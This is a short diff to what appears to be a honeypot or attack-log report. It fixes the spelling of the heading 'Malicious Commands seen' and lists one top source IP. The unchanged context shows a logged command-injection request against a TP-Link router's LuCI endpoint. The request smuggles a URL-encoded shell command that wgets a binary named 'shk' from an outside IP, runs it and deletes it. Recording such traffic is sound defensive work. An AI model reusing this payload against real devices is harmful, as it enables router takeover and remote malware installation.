@@ -7,7 +7,7 @@ Top 5 IPs for 2024-04-04 :
 121.136.113.8
 
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)
 
